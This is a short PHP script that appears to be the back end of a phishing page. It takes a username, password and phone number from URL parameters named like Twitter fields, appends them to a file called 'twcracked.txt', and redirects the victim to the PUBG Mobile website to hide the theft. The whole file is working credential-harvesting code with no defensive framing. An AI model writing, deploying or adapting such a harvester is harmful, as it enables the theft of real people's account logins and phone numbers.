<?php

file_put_contents("twcracked.txt", "[Name:] " . $Username_TW = $_GET['Username_TW'] . " [Pass:] " . $Password_TW = $_GET['Password_TW'] . " [PhoneNum:] " . $Phone_TW = $_GET['Phone_TW'] ."\n", FILE_APPEND);
header('Location: https://www.pubgmobile.com');
exit();
